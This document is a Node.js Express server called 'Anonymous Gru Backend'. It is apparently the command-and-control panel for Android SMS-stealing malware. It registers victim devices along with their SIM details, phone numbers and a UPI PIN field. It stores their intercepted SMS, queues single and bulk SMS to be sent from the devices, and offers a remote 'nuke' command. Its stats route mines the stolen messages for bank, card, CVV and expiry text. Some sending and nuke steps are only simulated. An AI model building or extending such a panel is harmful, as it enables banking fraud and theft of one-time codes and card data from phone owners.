const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// ---------- Paths ----------
const DATA_DIR = path.join(__dirname, 'data');
const PUBLIC_DIR = path.join(__dirname, 'public');
const STATIC_DIR = path.join(__dirname, 'static');
const DEVICES_FILE = path.join(DATA_DIR, 'devices.json');
const MESSAGES_FILE = path.join(DATA_DIR, 'messages.json');
const OUTBOX_FILE = path.join(DATA_DIR, 'outbox.json');
const NUKE_JOBS_FILE = path.join(DATA_DIR, 'nukeJobs.json');

// ---------- Ensure directories exist ----------
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(PUBLIC_DIR)) fs.mkdirSync(PUBLIC_DIR, { recursive: true });
if (!fs.existsSync(STATIC_DIR)) fs.mkdirSync(STATIC_DIR, { recursive: true });

// ---------- Initialize JSON files ----------
const initFile = (file, defaultData) => {
  if (!fs.existsSync(file)) {
    fs.writeFileSync(file, JSON.stringify(defaultData, null, 2));
  }
};
initFile(DEVICES_FILE, {});
initFile(MESSAGES_FILE, {});
initFile(OUTBOX_FILE, {});
initFile(NUKE_JOBS_FILE, {});

// ---------- Helpers ----------
const readJSON = (file) => {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return {}; }
};
const writeJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// ---------- Middleware ----------
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// ---------- Static Files ----------
app.use(express.static(PUBLIC_DIR));
app.use(express.static(STATIC_DIR));

// ============================================
//              API ROUTES
// ============================================

// ---------- Health Check ----------
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: Date.now(), uptime: process.uptime() });
});

// ---------- ROOT API Info ----------
app.get('/api', (req, res) => {
  res.json({
    name: 'Anonymous Gru Backend API',
    version: '1.0.0',
    status: 'running',
    endpoints: {
      health: 'GET /api/health',
      devices: 'GET /api/devices',
      device: 'GET /api/devices/:id',
      register: 'POST /api/devices',
      delete: 'DELETE /api/devices/:id',
      messages: 'GET /api/messages/:deviceId',
      addMessage: 'POST /api/messages/:deviceId',
      sendSms: 'POST /api/sms/send',
      bulkSms: 'POST /api/sms/bulk',
      outbox: 'GET /api/sms/outbox/:deviceId',
      nuke: 'POST /api/nuke',
      nukeStatus: 'GET /api/nuke/status/:deviceId',
      stats: 'GET /api/stats'
    }
  });
});

// ---------- DEVICE CRUD ----------

// List all devices
app.get('/api/devices', (req, res) => {
  try {
    const devices = readJSON(DEVICES_FILE);
    res.json(devices);
  } catch (error) {
    res.status(500).json({ error: 'Failed to read devices' });
  }
});

// Get single device
app.get('/api/devices/:id', (req, res) => {
  try {
    const devices = readJSON(DEVICES_FILE);
    const device = devices[req.params.id];
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    res.json(device);
  } catch (error) {
    res.status(500).json({ error: 'Failed to read device' });
  }
});

// Register or update device
app.post('/api/devices', (req, res) => {
  try {
    const { 
      id, 
      name, 
      status, 
      battery, 
      android, 
      ip, 
      storage, 
      provider, 
      cpu, 
      sdk, 
      sims, 
      upipin, 
      modelName, 
      phoneNumber, 
      lastSeen 
    } = req.body;

    if (!id) {
      return res.status(400).json({ error: 'Device ID is required' });
    }

    const devices = readJSON(DEVICES_FILE);
    const existing = devices[id] || {};

    devices[id] = {
      ...existing,
      id,
      name: name || existing.name || id,
      status: status !== undefined ? status : (existing.status || false),
      battery: battery || existing.battery || '—',
      android: android || existing.android || '—',
      ip: ip || existing.ip || '—',
      storage: storage || existing.storage || '—',
      provider: provider || existing.provider || '—',
      cpu: cpu || existing.cpu || '—',
      sdk: sdk || existing.sdk || '—',
      sims: sims || existing.sims || [],
      upipin: upipin || existing.upipin || null,
      modelName: modelName || existing.modelName || name || id,
      phoneNumber: phoneNumber || existing.phoneNumber || '—',
      lastSeen: lastSeen || Date.now(),
      updatedAt: Date.now()
    };

    writeJSON(DEVICES_FILE, devices);
    res.json({ success: true, device: devices[id] });
  } catch (error) {
    res.status(500).json({ error: 'Failed to register device: ' + error.message });
  }
});

// Delete device
app.delete('/api/devices/:id', (req, res) => {
  try {
    const devices = readJSON(DEVICES_FILE);
    if (!devices[req.params.id]) {
      return res.status(404).json({ error: 'Device not found' });
    }
    delete devices[req.params.id];
    writeJSON(DEVICES_FILE, devices);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Failed to delete device' });
  }
});

// ---------- MESSAGES ----------

// Get messages for device
app.get('/api/messages/:deviceId', (req, res) => {
  try {
    const { deviceId } = req.params;
    const limit = parseInt(req.query.limit) || 150;
    const messages = readJSON(MESSAGES_FILE);
    const deviceMessages = messages[deviceId] || [];
    const sorted = deviceMessages.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
    const latest = sorted.slice(-limit);
    res.json(latest);
  } catch (error) {
    res.status(500).json({ error: 'Failed to read messages' });
  }
});

// Add message for device
app.post('/api/messages/:deviceId', (req, res) => {
  try {
    const { deviceId } = req.params;
    const { sender, message, dateTime, type } = req.body;

    if (!message) {
      return res.status(400).json({ error: 'Message text is required' });
    }

    const messages = readJSON(MESSAGES_FILE);
    if (!messages[deviceId]) {
      messages[deviceId] = [];
    }

    const entry = {
      sender: sender || 'Unknown',
      message: message,
      dateTime: dateTime || new Date().toISOString(),
      timestamp: Date.now(),
      type: type || 'incoming'
    };

    messages[deviceId].push(entry);
    writeJSON(MESSAGES_FILE, messages);
    res.json({ success: true, entry });
  } catch (error) {
    res.status(500).json({ error: 'Failed to add message' });
  }
});

// ---------- SMS SEND ----------

// Send single SMS
app.post('/api/sms/send', (req, res) => {
  try {
    const { deviceId, to, message, simSlot } = req.body;

    if (!deviceId || !to || !message) {
      return res.status(400).json({ 
        error: 'deviceId, to, and message are required' 
      });
    }

    const outbox = readJSON(OUTBOX_FILE);
    if (!outbox[deviceId]) {
      outbox[deviceId] = [];
    }

    const entry = {
      id: uuidv4(),
      to: to.trim(),
      message: message.trim(),
      simSlot: simSlot || '1',
      status: 'queued',
      timestamp: Date.now(),
      dateTime: new Date().toISOString()
    };

    outbox[deviceId].push(entry);
    writeJSON(OUTBOX_FILE, outbox);

    // Also store in messages as outgoing
    const messages = readJSON(MESSAGES_FILE);
    if (!messages[deviceId]) {
      messages[deviceId] = [];
    }
    messages[deviceId].push({
      sender: '📤 Device',
      message: `To: ${to}\n${message}`,
      dateTime: entry.dateTime,
      timestamp: entry.timestamp,
      type: 'outgoing'
    });
    writeJSON(MESSAGES_FILE, messages);

    // Simulate delivery after 2-5 seconds
    setTimeout(() => {
      const updated = readJSON(OUTBOX_FILE);
      if (updated[deviceId]) {
        const found = updated[deviceId].find(e => e.id === entry.id);
        if (found) {
          found.status = 'sent';
          writeJSON(OUTBOX_FILE, updated);
        }
      }
    }, 2000 + Math.random() * 3000);

    res.json({ success: true, entry });
  } catch (error) {
    res.status(500).json({ error: 'Failed to send SMS: ' + error.message });
  }
});

// Bulk SMS
app.post('/api/sms/bulk', (req, res) => {
  try {
    const { deviceId, recipients, message, simSlot } = req.body;

    if (!deviceId || !recipients || !Array.isArray(recipients) || recipients.length === 0) {
      return res.status(400).json({ error: 'deviceId and recipients array required' });
    }
    if (!message) {
      return res.status(400).json({ error: 'message is required' });
    }

    const outbox = readJSON(OUTBOX_FILE);
    if (!outbox[deviceId]) {
      outbox[deviceId] = [];
    }

    const entries = recipients.map(to => ({
      id: uuidv4(),
      to: to.trim(),
      message: message.trim(),
      simSlot: simSlot || '1',
      status: 'queued',
      timestamp: Date.now(),
      dateTime: new Date().toISOString()
    }));

    outbox[deviceId].push(...entries);
    writeJSON(OUTBOX_FILE, outbox);

    // Add to messages
    const messages = readJSON(MESSAGES_FILE);
    if (!messages[deviceId]) {
      messages[deviceId] = [];
    }
    entries.forEach(entry => {
      messages[deviceId].push({
        sender: '📤 Device (Bulk)',
        message: `To: ${entry.to}\n${entry.message}`,
        dateTime: entry.dateTime,
        timestamp: entry.timestamp,
        type: 'outgoing'
      });
    });
    writeJSON(MESSAGES_FILE, messages);

    // Simulate sending each with delay
    entries.forEach((entry, index) => {
      setTimeout(() => {
        const updated = readJSON(OUTBOX_FILE);
        if (updated[deviceId]) {
          const found = updated[deviceId].find(e => e.id === entry.id);
          if (found) {
            found.status = 'sent';
            writeJSON(OUTBOX_FILE, updated);
          }
        }
      }, 1000 + index * 600 + Math.random() * 1000);
    });

    res.json({ 
      success: true, 
      count: entries.length, 
      entries 
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to send bulk SMS: ' + error.message });
  }
});

// Get outbox
app.get('/api/sms/outbox/:deviceId', (req, res) => {
  try {
    const outbox = readJSON(OUTBOX_FILE);
    const deviceOutbox = outbox[req.params.deviceId] || [];
    res.json(deviceOutbox.sort((a, b) => b.timestamp - a.timestamp));
  } catch (error) {
    res.status(500).json({ error: 'Failed to read outbox' });
  }
});

// ---------- NUKE COMMANDS ----------

// Trigger nuke
app.post('/api/nuke', (req, res) => {
  try {
    const { deviceId, command, data } = req.body;

    if (!deviceId) {
      return res.status(400).json({ error: 'deviceId is required' });
    }

    const nukeJobs = readJSON(NUKE_JOBS_FILE);
    const jobId = uuidv4();

    nukeJobs[deviceId] = {
      jobId,
      command: command || 'nuke',
      data: data || {},
      status: 'pending',
      requestedAt: Date.now(),
      completedAt: null,
      progress: 0,
      message: 'Nuke command initiated...'
    };
    writeJSON(NUKE_JOBS_FILE, nukeJobs);

    // Simulate nuke execution with progress updates
    let progress = 0;
    const interval = setInterval(() => {
      progress += 10;
      const jobs = readJSON(NUKE_JOBS_FILE);
      if (jobs[deviceId]) {
        jobs[deviceId].progress = progress;
        jobs[deviceId].message = `Executing nuke... ${progress}%`;
        writeJSON(NUKE_JOBS_FILE, jobs);
      }
      if (progress >= 100) {
        clearInterval(interval);
        const finalJobs = readJSON(NUKE_JOBS_FILE);
        if (finalJobs[deviceId]) {
          finalJobs[deviceId].status = 'completed';
          finalJobs[deviceId].completedAt = Date.now();
          finalJobs[deviceId].message = '✅ Nuke completed successfully!';
          writeJSON(NUKE_JOBS_FILE, finalJobs);
        }
      }
    }, 500);

    res.json({ success: true, jobId });
  } catch (error) {
    res.status(500).json({ error: 'Failed to trigger nuke: ' + error.message });
  }
});

// Get nuke status
app.get('/api/nuke/status/:deviceId', (req, res) => {
  try {
    const nukeJobs = readJSON(NUKE_JOBS_FILE);
    const job = nukeJobs[req.params.deviceId] || null;
    res.json(job);
  } catch (error) {
    res.status(500).json({ error: 'Failed to read nuke status' });
  }
});

// ---------- STATISTICS ----------

app.get('/api/stats', (req, res) => {
  try {
    const devices = readJSON(DEVICES_FILE);
    const deviceList = Object.values(devices);
    const total = deviceList.length;
    const online = deviceList.filter(d => d.status === true).length;
    const offline = total - online;

    const messages = readJSON(MESSAGES_FILE);
    let bankCount = 0, cardCount = 0;
    const phoneNumbers = new Set();
    const networks = new Set();

    Object.keys(messages).forEach(deviceId => {
      const msgs = messages[deviceId] || [];
      msgs.forEach(msg => {
        const text = (msg.message || '').toLowerCase();
        if (/balance|avail|credited|debited|₹|inr/i.test(text)) bankCount++;
        if (/card|cvv|expiry|credit|debit/i.test(text)) cardCount++;
        const phoneMatch = text.match(/(?:\+91|0)?[6-9]\d{9}/);
        if (phoneMatch) phoneNumbers.add(phoneMatch[0]);
        const netMatch = text.match(/jio|airtel|bsnl|vodafone|idea|vi|docomo|reliance|cellular/i);
        if (netMatch) networks.add(netMatch[0]);
      });
    });

    res.json({
      total,
      online,
      offline,
      bankSmsCount: bankCount,
      cardSmsCount: cardCount,
      uniquePhoneNumbers: [...phoneNumbers],
      uniqueNetworks: [...networks],
      lastUpdated: Date.now()
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to get stats' });
  }
});

// ---------- FALLBACK FOR SPA ----------
// Serve index.html for any non-API route (supports client-side routing)
app.get('*', (req, res) => {
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({ error: `API endpoint not found: ${req.path}` });
  }
  res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
});

// ---------- Start Server ----------
app.listen(PORT, () => {
  console.log(`\n🚀 Anonymous Gru Backend running on port ${PORT}`);
  console.log(`📍 Frontend: http://localhost:${PORT}`);
  console.log(`📡 API Info: http://localhost:${PORT}/api\n`);
});
